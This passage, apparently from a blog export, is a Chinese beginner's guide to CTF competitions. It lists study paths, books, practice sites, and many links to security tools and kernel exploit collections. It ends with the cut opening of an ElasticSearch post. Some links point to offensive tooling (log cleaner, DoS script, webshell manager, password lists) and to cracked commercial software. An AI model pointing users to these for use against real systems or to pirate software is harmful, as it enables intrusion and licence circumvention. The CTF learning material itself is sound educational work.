misc杂项，隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据\n reverse逆向windows、linux类\n ppc编程类的\n\n国内外著名比赛\n\n国外：\n 国内：xctf联赛0ctf上海国内外都有，很强\n\n入门需要哪些基础：\n\n1.编程语言基础（c、汇编、脚本语言）\n 2.数学基础（算法、密码学）\n 3.脑洞大开（天马行空的想象、推理解密）\n 4.体力耐力（通宵熬夜）\n\n如何入门学\n\n1.恶补基础知识\n 2.尝试从脑洞开始如黑客game\n 3.从基础题出发一般都是100，200，最高分在500，600先把100分的学好，可从实践，高中的ctf学起，比较简单，只涉及1，2个点\n 4.学信息安全专业知识\n 5.锻炼体力耐力周六日都有比赛\n\n到底如何学？\n\n1.分析赛题情况\n 2.分析自身能力自己最适合哪个方向\n 3.选择更适合的入手\n\n分析赛题\n\nPWN、Reverse偏重对汇编、逆向的理解对底层理解\n Crypto偏重对数学、算法的深入学习密码课要深入学\n Web偏重对技巧沉淀、快速搜索能力的挑战发散思维，对底层只需要了解，代码原理，关于漏洞点的积累\n Misc则更复杂，所有与计算机安全挑战有关的都在其中隐写，图片数据分析还原，流量，大数据，对游戏分析逆向\n\n常规做法：\n\nA方向：PWN+Reverse+Crypto随机搭配\n B方向：Web+Misc组合\n Misc所有人都可以做\n\n入门知识：\n\n都要学的内容：linux基础、计算机组成原理、操作系统原理、网络协议分析\n\nA方向：IDA工具使用（fs插件）、逆向工程、密码学、缓冲区溢出等\n B方向：Web安全、网络安全、内网渗透、数据库安全等前10的安全漏洞\n\n推荐书：\n\nA方向：\n\nREforBeginners\n IDAPro权威指南\n 揭秘家庭路由器0day漏洞挖掘技术\n 自己定操作系统\n 黑客攻防技术宝典：系统实战篇有各种系统的逆向讲解\n\nB方向：\n\nWeb应用安全权威指南最推荐小白，宏观web安全\n Web前端黑客技术揭秘\n 黑客秘籍——渗透测试实用指南\n 黑客攻防技术宝典web实战篇web安全的所有核心基础点，有挑战性，最常规，最全，学好会直线上升\n 代码审计：企业级web代码安全架构\n\n入门----从基础题目出发（推荐资源）：\n\n[http://ctf.idf.cn](https://links.jianshu.com/go?to=http%3A%2F%2Fctf.idf.cn)!!!首推idf实验室：题目非常基础，只1个点\n [www.ichunqiu.com](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ichunqiu.com)有线下决赛题目复现\n [http://oj.xctf.org.cn/xctf](https://links.jianshu.com/go?to=http%3A%2F%2Foj.xctf.org.cn%2Fxctf)题库网站，历年题，练习场，比较难\n [www.wechall.net/challs](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wechall.net%2Fchalls)!!!!!!非常入门的国外ctf题库，很多国内都是从这里刷题成长起来的\n [http://canyouhack.it/](https://links.jianshu.com/go?to=http%3A%2F%2Fcanyouhack.it%2F)国外，入门，有移动安全\n [https://microcorruption.com/loginA](https://links.jianshu.com/go?to=https%3A%2F%2Fmicrocorruption.com%2FloginA)方向密码，逆向酷炫游戏代\n http：//smashthestack.orgA方向，简洁，国外，wargames，过关\n [http://overthewire.ofg/wargames/](https://links.jianshu.com/go?to=http%3A%2F%2Foverthewire.ofg%2Fwargames%2F)！！！！推荐A方向国内资料多，老牌wargame\n https：//exploit-exercises.comA方向老牌wargame，国内资料多\n [http://pawnable.kr/play.phppwn](https://links.jianshu.com/go?to=http%3A%2F%2Fpawnable.kr%2Fplay.phppwn)类游乐场，不到100题\n [http://ctf.moonsoscom/pentest/index.phpB](https://links.jianshu.com/go?to=http%3A%2F%2Fctf.moonsoscom%2Fpentest%2Findex.phpB)方向米安的Web漏洞靶场，基础，核心知识点\n http：//prompt.ml/0B方向国外的xss测试\n [http://redtiger.labs.overthewire.org/B](https://links.jianshu.com/go?to=http%3A%2F%2Fredtiger.labs.overthewire.org%2FB)方向国外sql注入挑战网站，10关，过关的形式不同的注入，循序渐近地练习\n\n工具：\n [https://github.com/truongkma/ctf-tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftruongkma%2Fctf-tools)\n [https://github.com/Plkachu/v0lt](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPlkachu%2Fv0lt)\n [https://github.com/zardus/ctf-tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzardus%2Fctf-tools)\n [https://github.com/TUCTF/Tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTUCTF%2FTools)\n\n入门--以练促赛，以赛养练\n\n选择一场已经存在writeup的比赛\n\n总结解题过程，分析出题人想法\n\n参加一场最新的ctf比赛\n https：//ctftime.org/国际比赛，有很多基础的\n http：[//www.xctf.org.cn/](https://links.jianshu.com/go?to=%2F%2Fwww.xctf.org.cn%2F)国内比赛，比较难\n 以及一些ctf要用到的\n 整合版：\n\n[http://www.jz5u.com/Soft/Progra/tool/163275.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jz5u.com%2FSoft%2FProgra%2Ftool%2F163275.html)\n\n各种在线工具以及工具整合\n\n[http://www.ctftools.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ctftools.com%2F)\n\n内网自动化渗透脚本[https://github.com/SecureThisShit/WinPwn](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecureThisShit%2FWinPwn)\n\n一个初级内网渗透课程\n 视频:[https://pan.baidu.com/s/13yBZg6DaaMP_dRo1XhKooA](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F13yBZg6DaaMP_dRo1XhKooA)提取码：aeko\n PPT:[https://pan.baidu.com/s/13r6dH0GBbsuLVFP4nTg5Yg](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F13r6dH0GBbsuLVFP4nTg5Yg)提取码：fuh8逆向工程:\n GDB–[http://www.gnu.org/software/gdb/download/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgdb%2Fdownload%2F)\n IDAPro–[https://www.hex-rays.com/products/ida/support/download.shtml](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.hex-rays.com%2Fproducts%2Fida%2Fsupport%2Fdownload.shtml)\n ImmunityDebugger–[http://debugger.immunityinc.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fdebugger.immunityinc.com%2F)\n OllyDbg–[http://www.ollydbg.de/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ollydbg.de%2F)\n radare2–[http://www.radare.org/y/?p=download](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.radare.org%2Fy%2F%3Fp%3Ddownload)\n Hopper–[http://www.hopperapp.com/download.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.hopperapp.com%2Fdownload.html)\n nm–unix/linuxtool\n objdump–linuxtool\n strace–linuxtool\n ILSpy–[http://ilspy.net/](https://links.jianshu.com/go?to=http%3A%2F%2Filspy.net%2F)\n JD-GUI–[http://jd.benow.ca/#jd-gui-overview](https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F%23jd-gui-overview)\n FFDec–[http://www.free-decompiler.com/flash/download.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.free-decompiler.com%2Fflash%2Fdownload.html)\n dex2jar–[http://code.google.com/p/dex2jar/](https://links.jianshu.com/go?to=http%3A%2F%2Fcode.google.com%2Fp%2Fdex2jar%2F)\n uncompyle2–[https://github.com/wibiti/uncompyle2](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwibiti%2Funcompyle2)\n Hexeditors:\n Windows:\n HxD–[http://mh-nexus.de/en/hxd/](https://links.jianshu.com/go?to=http%3A%2F%2Fmh-nexus.de%2Fen%2Fhxd%2F)\n Neo–[http://www.new-hex-editor.com/hex-editor-downloads.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.new-hex-editor.com%2Fhex-editor-downloads.html)\n Linux:\n Bless–[http://home.gna.org/bless/downloads.html](https://links.jianshu.com/go?to=http%3A%2F%2Fhome.gna.org%2Fbless%2Fdownloads.html)\n wxHexEditor–[http://www.wxhexeditor.org/download.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wxhexeditor.org%2Fdownload.php)\n Exeunpackers–UnpackingKit2012–[http://forum.exetools.com/showthread.php?t=13610](https://links.jianshu.com/go?to=http%3A%2F%2Fforum.exetools.com%2Fshowthread.php%3Ft%3D13610)\n\n网络:\n Wireshark,tshark–[https://www.wireshark.org/download.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.wireshark.org%2Fdownload.html)\n OpenVPN–[https://openvpn.net/](https://links.jianshu.com/go?to=https%3A%2F%2Fopenvpn.net%2F)\n OpenSSL–[https://www.openssl.org/related/binaries.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.openssl.org%2Frelated%2Fbinaries.html)\n tcpdump–[http://www.tcpdump.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.tcpdump.org%2F)\n netcat–[http://netcat.sourceforge.net/](https://links.jianshu.com/go?to=http%3A%2F%2Fnetcat.sourceforge.net%2F)\n nmap–[http://nmap.org/download.html](https://links.jianshu.com/go?to=http%3A%2F%2Fnmap.org%2Fdownload.html)\n\n隐写:\n OpenStego–[http://www.openstego.info/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.openstego.info%2F)\n OutGuess–[http://www.outguess.org/download.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.outguess.org%2Fdownload.php)\n Steghide–[http://steghide.sourceforge.net/download.php](https://links.jianshu.com/go?to=http%3A%2F%2Fsteghide.sourceforge.net%2Fdownload.php)\n StegFS–[http://sourceforge.net/projects/stegfs/](https://links.jianshu.com/go?to=http%3A%2F%2Fsourceforge.net%2Fprojects%2Fstegfs%2F)\n pngcheck–[http://www.libpng.org/pub/png/apps/pngcheck.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.libpng.org%2Fpub%2Fpng%2Fapps%2Fpngcheck.html)\n GIMP–[http://www.gimp.org/downloads/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gimp.org%2Fdownloads%2F)\n Audacity–[http://audacity.sourceforge.net/download/](https://links.jianshu.com/go?to=http%3A%2F%2Faudacity.sourceforge.net%2Fdownload%2F)\n MP3Stego–[http://www.petitcolas.net/steganography/mp3stego/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.petitcolas.net%2Fsteganography%2Fmp3stego%2F)\n ffmpeg(forvideoanalysis)–[https://www.ffmpeg.org/download.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ffmpeg.org%2Fdownload.html)\n\n电子取证:\n dd–unix/linuxtool\n strings–unix/linuxtool\n scalpel–[https://github.com/sleuthkit/scalpel](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsleuthkit%2Fscalpel)\n TrID–[http://mark0.net/soft-trid-e.html](https://links.jianshu.com/go?to=http%3A%2F%2Fmark0.net%2Fsoft-trid-e.html)\n binwalk–[http://binwalk.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fbinwalk.org%2F)\n foremost–[http://foremost.sourceforge.net/](https://links.jianshu.com/go?to=http%3A%2F%2Fforemost.sourceforge.net%2F)\n ExifTool–[http://www.sno.phy.queensu.ca/~phil/exiftool/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sno.phy.queensu.ca%2F~phil%2Fexiftool%2F)\n DigitalForensicsFramework(DFF)–[http://www.digital-forensic.org/download/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.digital-forensic.org%2Fdownload%2F)\n ComputerAidedINvestigativeEnvironment(CAINE)Linuxforensicslivedistribution–[http://www.caine-live.net/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.caine-live.net%2F)\n TheSleuthKit(TSK)–[http://www.sleuthkit.org/sleuthkit/download.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sleuthkit.org%2Fsleuthkit%2Fdownload.php)\n Volatility–[http://code.google.com/p/volatility/](https://links.jianshu.com/go?to=http%3A%2F%2Fcode.google.com%2Fp%2Fvolatility%2F)\n\n编程以及编码工具/PPC:\n Texteditors:\n SublimeText–[http://www.sublimetext.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sublimetext.com%2F)\n Notepad++–[http://notepad-plus-plus.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fnotepad-plus-plus.org%2F)\n vim–[http://www.vim.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vim.org%2F)\n emacs–[http://www.gnu.org/software/emacs/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Femacs%2F)\n\n密码学:\n Cryptool–[https://www.cryptool.org/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cryptool.org%2F)\n hashpump–[https://github.com/bwall/HashPump](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbwall%2FHashPump)\n Sage–[http://www.sagemath.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sagemath.org%2F)\n JohntheRipper–[http://www.openwall.com/john/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.openwall.com%2Fjohn%2F)\n xortool–[https://github.com/hellman/xortool](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fhellman%2Fxortool)\n\n在线工具:\n [http://www.crypo.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.crypo.com%2F)\n [http://www.cryptool-online.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cryptool-online.org%2F)\n [http://rumkin.com/tools/cipher/](https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2F)\n Modulesforpython–pycrypto–[https://www.dlitz.net/software/pycrypto/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.dlitz.net%2Fsoftware%2Fpycrypto%2F)\n\ncmd5:\n\n[http://pmd5.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fpmd5.com%2F)\n\n[http://www.cmd5.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cmd5.com%2F)\n\n进制转换-[https://tool.lu/hexconvert](https://links.jianshu.com/go?to=https%3A%2F%2Ftool.lu%2Fhexconvert)\n\n在线运行代码-[https://c.runoob.com/compile/1](https://links.jianshu.com/go?to=https%3A%2F%2Fc.runoob.com%2Fcompile%2F1)\n **工具**\n 秘迹：[https://m.mijisou.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fm.mijisou.com%2F)\n\n在线病毒检测引擎：[http://www.virscan.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.virscan.org%2F)\n\n云扫描病毒：[http://www.scanvir.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.scanvir.com%2F)\n\n威胁情报分析平台：[https://x.threatbook.cn/partner](https://links.jianshu.com/go?to=https%3A%2F%2Fx.threatbook.cn%2Fpartner)\n\nWebShell检测引擎：[https://scanner.baidu.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fscanner.baidu.com%2F)\n\n知道创宇：[https://github.com/knownsec](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fknownsec)\n\nDm：[https://github.com/Dm2333](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FDm2333)\n\nEventCleaner：[https://github.com/360-A-Team/EventCleaner](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2F360-A-Team%2FEventCleaner)\n\n验证码识别库：[http://www.wzdr.cn/article-534.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wzdr.cn%2Farticle-534.html)\n\n中国特色弱口令生成器：[https://github.com/RicterZ/genpAss](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FRicterZ%2FgenpAss)\n\nMSDN各种工具和服务器镜像：[https://msdn.itellyou.cn/](https://links.jianshu.com/go?to=https%3A%2F%2Fmsdn.itellyou.cn%2F)\n\nC32asm最佳的静态反汇编软件：[http://www.c32asm.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.c32asm.com%2F)\n\nPHP在线加解密网站：[http://www.zhaoyuanma.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.zhaoyuanma.com%2F)\n\nK8工具合集：[https://github.com/k8gege/K8tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fk8gege%2FK8tools)\n\nWinAFL模糊测试工具：[https://github.com/ivanfratric/winafl](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fivanfratric%2Fwinafl)\n\n异步目标枚举工具：[https://github.com/welchbj/bscan](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwelchbj%2Fbscan)\n\n开源扫描仪工具箱：[https://github.com/We5ter/Scanners-Box](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FWe5ter%2FScanners-Box)\n\nFCN：[https://github.com/boywhp/fcn](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fboywhp%2Ffcn)\n\n浏览器的PWN：[https://github.com/m1ghtym0/browser-pwn](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fm1ghtym0%2Fbrowser-pwn)\n\n高级威胁战术：[https://www.cobaltstrike.com/training](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cobaltstrike.com%2Ftraining)\n\n风控预警平台：[https://github.com/creditease-sec/insight](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fcreditease-sec%2Finsight)\n\n暴力破解工具Hydra（九头蛇）：\n\nhttps://www.jianshu.com/p/e02ef0a00786\n\n万能密码字典：\n\n[https://wenku.baidu.com/view/d55f60e4c281e53a5902ff0d](https://links.jianshu.com/go?to=https%3A%2F%2Fwenku.baidu.com%2Fview%2Fd55f60e4c281e53a5902ff0d)\n\nSubFinder是一个子域发现工具：\n\n[https://github.com/subfinder/subfinder](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsubfinder%2Fsubfinder)\n\n中国蚂剑：\n\n[https://github.com/AntSwordProject/antSword/releases](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAntSwordProject%2FantSword%2Freleases)\n\nWindows-Exploit-Suggester：\n\n[https://github.com/GDSSecurity/Windows-Exploit-Suggester](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FGDSSecurity%2FWindows-Exploit-Suggester)\n\n构造优质上传漏洞fuzz字典：\n\n[http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/](https://links.jianshu.com/go?to=http%3A%2F%2Fgv7.me%2Farticles%2F2018%2Fmake-upload-vul-fuzz-dic%2F)\n\n一款识别图形验证码的BurpSuite插件：\n\nhttps://www.jianshu.com/p/a0262883b751\n\nslowloris.py-Python中的简单slowloris：\n\n[https://github.com/gkbrk/slowloris](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgkbrk%2Fslowloris)\n\nSharpSploit控制台：\n\n[https://github.com/anthemtotheego/SharpSploitConsole](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fanthemtotheego%2FSharpSploitConsole)\n\n研究个人编译APT恶意软件：\n\n[https://github.com/sapphirex00/Threat-Hunting](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsapphirex00%2FThreat-Hunting)\n\n代理行动规则：\n\n[https://github.com/PortSwigger/proxy-action-rules](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPortSwigger%2Fproxy-action-rules)\n\nSwitchHosts---快速切换主机：\n\n[https://github.com/oldj/SwitchHosts](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Foldj%2FSwitchHosts)\n\nXshell6.0破解版本（绿色破解）：\n\n[https://download.csdn.net/download/qq_32589267/10792860](https://links.jianshu.com/go?to=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fqq_32589267%2F10792860)\n\nBurpSuite破解版（含注册机，无后门）：\n\n[https://blog.csdn.net/u014549283/article/details/81248886](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fu014549283%2Farticle%2Fdetails%2F81248886)\n\nx-pack-core-6.4.2破解版亲测可用：\n\n[https://download.csdn.net/download/czs208112/10718181](https://links.jianshu.com/go?to=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fczs208112%2F10718181)\n\nWiki收集RedTeam基础架构强化资源：\n\n[https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbluscreenofjeff%2FRed-Team-Infrastructure-Wiki)\n\n应急响应工具大合集：\n\n[https://github.com/meirwah/awesome-incident-response](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fmeirwah%2Fawesome-incident-response)\n\n蜜罐：\n\n[https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fparalax%2Fawesome-honeypots%2Fblob%2Fmaster%2FREADME_CN.md)\n\n电子书籍：\n\n安全思维导图集合：[https://github.com/SecWiki/sec-chart](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecWiki%2Fsec-chart)\n PHP编程：[https://pan.baidu.com/s/1ZvUdonJ_h3EYTfHIbjoe6A](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1ZvUdonJ_h3EYTfHIbjoe6A)\n 代码审计入门：[http://www.cnblogs.com/Oran9e/p/7763751.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cnblogs.com%2FOran9e%2Fp%2F7763751.html)\n 墨者学院审计类通关指南：[https://xz.aliyun.com/t/2821](https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F2821)\n IT畅销电子书：[https://www.packtpub.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.packtpub.com%2F)\n\n资源网站：\n KaliLinux渗透测试：\n [https://mp.weixin.qq.com/s/8UcU7R803k3gcextswzGlQ](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8UcU7R803k3gcextswzGlQ)\n Oday安全：\n [http://www.0daysecurity.com/penetration-testing/enumeration.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.0daysecurity.com%2Fpenetration-testing%2Fenumeration.html)\n IT资料搜寻网站：\n [https://www.programcreek.com/java-api-examples/?action=search](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.programcreek.com%2Fjava-api-examples%2F%3Faction%3Dsearch)\n web安全基础（解压密码：xindong）：\n [https://pan.baidu.com/s/1xyAXrQceq9bUzfBrYc4bBA](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1xyAXrQceq9bUzfBrYc4bBA)\n\n其它知识点：\n Poc基础知识：[https://poc.evalbug.com/chapter1/1.html](https://links.jianshu.com/go?to=https%3A%2F%2Fpoc.evalbug.com%2Fchapter1%2F1.html)\n 对CDN的误区：[http://www.rinige.com/index.php/archives/772/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.rinige.com%2Findex.php%2Farchives%2F772%2F)\n 同时部署WAF和CDN：\n [https://help.aliyun.com/knowledge_detail/42200.html](https://links.jianshu.com/go?to=https%3A%2F%2Fhelp.aliyun.com%2Fknowledge_detail%2F42200.html)\n Linux系统清除缓存【整理】：\n [https://blog.csdn.net/qiuzhi__ke/article/details/70768544](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqiuzhi__ke%2Farticle%2Fdetails%2F70768544)\n 大马小马的区别：\n [http://www.cnhonkerarmy.com/thread-156156-1-1.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cnhonkerarmy.com%2Fthread-156156-1-1.html)\n 面试必备之乐观锁与悲观锁：\n [https://blog.csdn.net/qq_34337272/article/details/81072874](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq_34337272%2Farticle%2Fdetails%2F81072874)\n 一套实用的渗透测试岗位面试题：\n [https://zhuanlan.zhihu.com/p/25582026](https://links.jianshu.com/go?to=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F25582026)\n IPC![、ADMIN](https://math.jianshu.com/math?formula=%E3%80%81ADMIN)、C![、D](https://math.jianshu.com/math?formula=%E3%80%81D)是什么?如何关闭删除Windows默认共享：\n [https://m.jb51.net/softjc/2124.html](https://links.jianshu.com/go?to=https%3A%2F%2Fm.jb51.net%2Fsoftjc%2F2124.html)\n php下进行mysql参数化查询：\n [https://blog.csdn.net/lpwmm/article/details/50733698](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Flpwmm%2Farticle%2Fdetails%2F50733698)\n\n闲趣文章：\n\n2018中国白帽人才调查报告：\n\n[https://www.anquanke.com/post/id/170034](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F170034)\n\n如何走进黑客世界：\n\n[https://www.freebuf.com/articles/neopoints/190895.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fneopoints%2F190895.html)\n\n网络安全行业全景图：\n\n[https://mp.weixin.qq.com/s/gksuSM7S-MLZ5LFz6-kjdw](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FgksuSM7S-MLZ5LFz6-kjdw)\n\n\n\n## linux kernel\n\n进行分析的大致流程如下：首先要会搭建环境，复现相应版本的相应漏洞，可以用gdb+qemu，也可以用另一台机器编译内核。然后查看源码并调试，这可以折腾自己喜欢的编辑器，并对照相应的补丁，了解更多细节。最后可以尝试在poc的基础上写自己的exp。自己直接阅读 Linux kernel 源码的话可能无从下手，可以先了解一下Linux内核源码目录结构，比如 drivers是设备驱动、arch是cpu相关代码、virt是虚拟化相关、security实现安全特性等等。然后从Linux内核可以被攻击的方面出发，比如系统调用、驱动、进程管理、网络，然后查找相应cve，比如CVE-2017-5123属于系统调用的漏洞。了解常见的攻击类型，比如栈溢出、堆溢出、UAF、整数溢出、race condition、权限检查不当、类型转换错误等等。了解Linux内核的防护机制，比如KASLR、SMEP、SELINUX等等。\n\n### Interactive map of Linux kernel\n\nhttp://www.makelinux.net/kernel_map/\n\n## 书籍\n\n### 《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani\n\nhttp://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8\n\n### 《Linux Kernel Architecture》，Wolfgang Mauerer\n\nhttp://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79\n\n### 《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds\n\nhttp://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC\n\n## 源码\n\n### Linux内核源码\n\nhttps://github.com/torvalds/linux\n\n### Linux各版本内核\n\nhttps://www.kernel.org/pub/linux/kernel/\n\n### Linux内核代码在线查看\n\n[http://lxr.free-electrons.com](http://lxr.free-electrons.com/)\n\n## exp及分析文章\n\n### linux-kernel-exploits\n\nhttps://github.com/SecWiki/linux-kernel-exploits\n\n### kernel exploit\n\nhttps://github.com/lucyoa/kernel-exploits\n\n### kernel heap overflow利用\n\nhttps://zhuanlan.zhihu.com/p/26674557\n\n### kernel exploit(适合入门)\n\nhttps://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf\n\n### blackhat kernel议题\n\nhttps://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf\n\n## FUZZ\n\n### syzkaller\n\n这个链接的前半部分的内容详细解释了如何搭建一个qemu + gdb的环境\nhttps://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md\n\n### Awesome-Fuzzing\n\nhttps://github.com/secfigo/Awesome-Fuzzing\n\n## 其他\n\n### x86_64 Assembly\n\nhttps://0xax.github.io/categories/assembler/\n\n### 64-bit system call numbers and entry vectors\n\nhttps://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl\n\n### 翻过的文章记录\n\n深入理解linux系统下proc文件系统内容\nhttp://www.cnblogs.com/cute/archive/2011/04/20/2022280.html\nWhat is mode_t in C?\nhttps://jameshfisher.com/2017/02/24/what-is-mode_t.html\nUnderstanding a Kernel Oops!\nhttp://opensourceforu.com/2011/01/understanding-a-kernel-oops/\nLinux Kernel Procfs Guide\nhttps://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&do=get&target=procfs-guide_2.6.29.pdf\n用户空间与内核空间数据交换的方式(2)——procfs\nhttp://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html\n用户空间和内核空间传递数据：get_user；put_user;copy_to_user;copy_from_user\nhttp://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html\n谈结构体struct 初始化多出的点号“.”，数组[]初始化多出的逗号“,”\nhttps://blog.csdn.net/comwise/article/details/9087279\nRoot exploit for Android and Linux（CVE-2010-4258）\nhttps://blog.csdn.net/hu3167343/article/details/36892563\n\n\n\n思维导图：\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190728162957829.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RSb25kb25n,size_16,color_FFFFFF,t_70)\n\n\n\n","tags":["ctf"],"categories":["ctf"]},{"title":"ElasticSearch基本原理介绍","url":"/2020/02/10/es基本原理介绍/","content":"\n## ElasticSearch基本原理介绍\n\n### 索引结构\n\n在存储结构上，由_index, _type和_id唯一标示一个文档。_index指向一个或者多个物理分片的逻辑命名空间，_type类型用于区分同一个集合中的不同的细分。_id文档标识符由系统自动生成或者使用者提供。\n\n### 分片\n\nES将数据副本分为主从两个部分，即主分片和副分片。主分片为权威数据，写过程先写主分片，成功之后再写副分片，恢复过程以主分片为主。 \n\n### 集群内部原理\n\n集群节点角色：\n\n1. 